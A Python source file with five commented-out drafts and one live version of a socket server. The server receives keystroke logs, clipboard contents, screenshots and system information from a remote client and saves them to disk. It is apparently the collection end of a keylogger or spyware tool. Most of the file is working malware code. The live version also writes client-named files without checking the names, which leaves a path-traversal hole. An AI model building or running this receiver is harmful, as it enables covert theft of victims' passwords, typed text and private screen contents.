# import socket
# import json
# import pandas as pd
# from encryption_utils import decrypt
# from datetime import datetime
# import os

# IP = '0.0.0.0'
# PORT = 9999

# if not os.path.exists("logs"):
#     os.makedirs("logs")

# def save_to_excel(data):
#     timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
#     df = pd.DataFrame([{
#         "Time": timestamp,
#         "Keys": ''.join(data.get("Keys", [])),
#         "Clipboard": data.get("Clipboard", ""),
#         "System Info": str(data.get("System Info", {})),
#     }])
#     filename = f"logs/log_{timestamp}.xlsx"
#     df.to_excel(filename, index=False)
#     print(f"[+] Data saved to {filename}")

#     # Optional: Save screenshot if available
#     if "Screenshot" in data and data["Screenshot"] != "Screenshot not found":
#         with open(f"logs/screenshot_{timestamp}.png", "wb") as img:
#             img.write(bytes.fromhex(data["Screenshot"]))
#         print(f"[+] Screenshot saved")

# def main():
#     s = socket.socket()
#     s.bind((IP, PORT))
#     s.listen(5)
#     print(f"[Server] Listening on {IP}:{PORT}")

#     while True:
#         client, addr = s.accept()
#         print(f"[+] Connection from {addr}")

#         data = client.recv(1000000).decode()
#         decrypted_data = decrypt(data)
#         json_data = json.loads(decrypted_data)

#         save_to_excel(json_data)

#         client.send(b"Data received and saved.")
#         client.close()

# if __name__ == "__main__":
#     main()









# import socket
# import os
# from datetime import datetime

# IP = '0.0.0.0'
# PORT = 9999

# # Create output directory
# if not os.path.exists("received_logs"):
#     os.makedirs("received_logs")

# def receive_file(conn, filename_prefix):
#     data = b''
#     while True:
#         try:
#             chunk = conn.recv(4096)
#             if not chunk:
#                 break
#             data += chunk
#         except:
#             break

#     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
#     filename = f"received_logs/{filename_prefix}_{timestamp}"
    
#     if filename_prefix == "screenshot":
#         filename += ".png"
#         with open(filename, 'wb') as f:
#             f.write(data)
#     else:
#         filename += ".txt"
#         with open(filename, 'wb') as f:
#             f.write(data)

#     print(f"[Server] Received and saved {filename}")

# def main():
#     s = socket.socket()
#     s.bind((IP, PORT))
#     s.listen(5)
#     print(f"[Server] Listening on {IP}:{PORT}")

#     while True:
#         conn, addr = s.accept()
#         print(f"[Server] Connection from {addr}")

#         # Step 1: Receive metadata
#         try:
#             meta = conn.recv(1024).decode().strip()
#         except:
#             conn.close()
#             continue

#         if meta in ["keystroke", "clipboard", "screenshot"]:
#             print(f"[Server] Receiving {meta} data...")
#             receive_file(conn, meta)
#         else:
#             print("[Server] Unknown metadata. Skipping.")
        
#         conn.close()

# if __name__ == "__main__":
#     main()







# import socket
# import os
# import datetime

# # Server listens on all interfaces at port 9999
# IP = '0.0.0.0'
# PORT = 9999

# # Function to save incoming file data
# def save_file(filename, data, mode='wb'):
#     with open(filename, mode) as f:
#         f.write(data)

# def start_server():
#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#         s.bind((IP, PORT))
#         s.listen(1)
#         print(f"[Server] Listening on {IP}:{PORT}")

#         conn, addr = s.accept()
#         with conn:
#             print(f"[Server] Connected by {addr}")

#             # Create logs folder if not exists
#             os.makedirs("received_logs", exist_ok=True)
#             timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

#             for _ in range(3):  # Expecting 3 files from client
#                 header = conn.recv(1024).decode()
#                 if not header:
#                     print("[Server] No header received.")
#                     break

#                 try:
#                     filename, size = header.split("::")
#                     size = int(size)
#                 except ValueError:
#                     print(f"[Server] Invalid header: {header}")
#                     break

#                 print(f"[Server] Receiving {filename} ({size} bytes)")

#                 # Receive the file data
#                 data = b''
#                 while len(data) < size:
#                     packet = conn.recv(4096)
#                     if not packet:
#                         break
#                     data += packet

#                 # Save the received file
#                 filepath = os.path.join("received_logs", f"{timestamp}_{filename}")
#                 save_file(filepath, data)
#                 print(f"[Server] Saved {filepath}")

# if __name__ == "__main__":
#     start_server()







# import socket
# import os

# IP = '0.0.0.0'
# PORT = 9999
# BUFFER_SIZE = 4096
# SEPARATOR = "<SEPARATOR>"

# # Create directory if it doesn't exist
# save_dir = "received_logs"
# if not os.path.exists(save_dir):
#     os.makedirs(save_dir)

# def receive_file(client_socket):
#     try:
#         received = client_socket.recv(BUFFER_SIZE).decode()
#         if SEPARATOR not in received:
#             print("[Server] Invalid data format.")
#             return
#         filename, filesize = received.split(SEPARATOR)
#         filename = os.path.basename(filename)
#         filesize = int(filesize)

#         save_path = os.path.join(save_dir, filename)
#         print(f"[Server] Receiving {filename} ({filesize} bytes)")

#         with open(save_path, "wb") as f:
#             bytes_read = 0
#             while bytes_read < filesize:
#                 chunk = client_socket.recv(min(BUFFER_SIZE, filesize - bytes_read))
#                 if not chunk:
#                     break
#                 f.write(chunk)
#                 bytes_read += len(chunk)

#         print(f"[Server] Saved file: {save_path}")
#     except Exception as e:
#         print(f"[Server] Error receiving file: {e}")

# # Start server
# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
#     server_socket.bind((IP, PORT))
#     server_socket.listen(5)
#     print(f"[Server] Listening on {IP}:{PORT}")

#     while True:
#         client_socket, client_address = server_socket.accept()
#         print(f"[Server] Connected by {client_address}")
#         for _ in range(3):  # Expecting 3 files: keystrokes, clipboard, screenshot
#             receive_file(client_socket)
#         client_socket.close()






# import socket
# import os

# # Set to 0.0.0.0 to listen on all interfaces
# SERVER_IP = '0.0.0.0'
# PORT = 9999

# # Folder to store received logs
# SAVE_DIR = "received_logs"
# os.makedirs(SAVE_DIR, exist_ok=True)

# def receive_file(conn):
#     try:
#         # Receive the filename length first (4 bytes)
#         filename_len_bytes = conn.recv(4)
#         if not filename_len_bytes:
#             return False
#         filename_len = int.from_bytes(filename_len_bytes, 'big')

#         # Receive the filename
#         filename = conn.recv(filename_len).decode()
#         print(f"[Server] Receiving file: {filename}")

#         # Receive the file size (8 bytes)
#         file_size_bytes = conn.recv(8)
#         file_size = int.from_bytes(file_size_bytes, 'big')

#         # Receive the actual file data
#         received = 0
#         with open(os.path.join(SAVE_DIR, filename), "wb") as f:
#             while received < file_size:
#                 data = conn.recv(min(4096, file_size - received))
#                 if not data:
#                     break
#                 f.write(data)
#                 received += len(data)

#         print(f"[Server] Received {filename} ({file_size} bytes)")
#         return True

#     except Exception as e:
#         print(f"[Server] Error receiving file: {e}")
#         return False

# def start_server():
#     print(f"[Server] Starting on {SERVER_IP}:{PORT}...")
#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#         s.bind((SERVER_IP, PORT))
#         s.listen(1)
#         print("[Server] Waiting for client connection...")
#         conn, addr = s.accept()
#         print(f"[Server] Connected by {addr}")
#         with conn:
#             while True:
#                 success = receive_file(conn)
#                 if not success:
#                     break
#             print("[Server] All files received. Connection closed.")

# if __name__ == "__main__":
#     start_server()





import socket
import os

# Set to 0.0.0.0 to listen on all interfaces
SERVER_IP = '0.0.0.0'
PORT = 9999

# Folder to store received logs
SAVE_DIR = "received_logs"
os.makedirs(SAVE_DIR, exist_ok=True)

def receive_file(conn):
    try:
        # Receive the filename length first (4 bytes)
        filename_len_bytes = conn.recv(4)
        if not filename_len_bytes:
            return False
        filename_len = int.from_bytes(filename_len_bytes, 'big')

        # Receive the filename
        filename = conn.recv(filename_len).decode()
        print(f"[Server] Receiving file: {filename}")

        # Receive the file size (8 bytes)
        file_size_bytes = conn.recv(8)
        file_size = int.from_bytes(file_size_bytes, 'big')

        # Receive the actual file data
        received = 0
        with open(os.path.join(SAVE_DIR, filename), "wb") as f:
            while received < file_size:
                data = conn.recv(min(4096, file_size - received))
                if not data:
                    break
                f.write(data)
                received += len(data)

        print(f"[Server] Received {filename} ({file_size} bytes)")
        return True

    except Exception as e:
        print(f"[Server] Error receiving file: {e}")
        return False

def start_server():
    print(f"[Server] Starting on {SERVER_IP}:{PORT}...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((SERVER_IP, PORT))
        s.listen(1)
        print("[Server] Waiting for client connection...")
        conn, addr = s.accept()
        print(f"[Server] Connected by {addr}")
        with conn:
            while True:
                success = receive_file(conn)
                if not success:
                    break
            print("[Server] All files received. Connection closed.")

if __name__ == "__main__":
    start_server()
